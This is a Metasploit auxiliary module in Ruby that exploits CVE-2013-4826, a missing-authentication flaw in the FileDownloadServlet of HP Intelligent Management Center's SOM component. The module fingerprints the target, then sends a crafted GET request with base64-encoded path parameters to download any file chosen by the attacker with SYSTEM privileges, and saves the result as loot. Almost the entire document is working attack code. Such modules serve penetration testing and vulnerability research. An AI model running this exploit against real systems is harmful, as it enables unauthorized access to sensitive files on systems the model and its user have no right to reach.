##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HP Intelligent Management SOM FileDownloadServlet Arbitrary Download',
      'Description'    => %q{
          This module exploits a lack of authentication and access control in HP Intelligent
        Management, specifically in the FileDownloadServlet from the SOM component, in order to
        retrieve arbitrary files with SYSTEM privileges. This module has been tested successfully
        on HP Intelligent Management Center 5.2_E0401 with SOM 5.2 E0401 over Windows 2003 SP2.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2013-4826' ],
          [ 'OSVDB', '98251' ],
          [ 'BID', '62898' ],
          [ 'ZDI', '13-242' ]
        ]
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'Path to HP Intelligent Management Center', '/imc']),
        OptString.new('FILEPATH', [true, 'The path of the file to download', 'c:\\boot.ini'])
      ], self.class)
  end

  def is_imc_som?
    res = send_request_cgi({
      'uri'      => normalize_uri("servicedesk", "ServiceDesk.jsp"),
      'method'   => 'GET'
    })

    if res and res.code == 200 and res.body =~ /servicedesk\/servicedesk/i
      return true
    else
      return false
    end
  end

  def my_basename(filename)
    return ::File.basename(filename.gsub(/\\/, "/"))
  end

  def run_host(ip)

    unless is_imc_som?
      vprint_error("#{rhost}:#{rport} - HP iMC with the SOM component not found")
      return
    end

    vprint_status("#{rhost}:#{rport} - Sending request...")
    res = send_request_cgi({
      'uri'          => normalize_uri("servicedesk", "servicedesk", "fileDownload"),
      'method'       => 'GET',
      'vars_get'     =>
        {
          'OperType' => '2',
          'fileName' => Rex::Text.encode_base64(my_basename(datastore['FILEPATH'])),
          'filePath' => Rex::Text.encode_base64(datastore['FILEPATH'])
        }
    })

    if res and res.code == 200 and res.headers['Content-Type'] and res.headers['Content-Type'] =~ /application\/doc/
      contents = res.body
      fname = my_basename(datastore['FILEPATH'])
      path = store_loot(
        'hp.imc.somfiledownloadservlet',
        'application/octet-stream',
        ip,
        contents,
        fname
      )
      print_good("#{rhost}:#{rport} - File saved in: #{path}")
    else
      vprint_error("#{rhost}:#{rport} - Failed to retrieve file")
      return
    end
  end
end
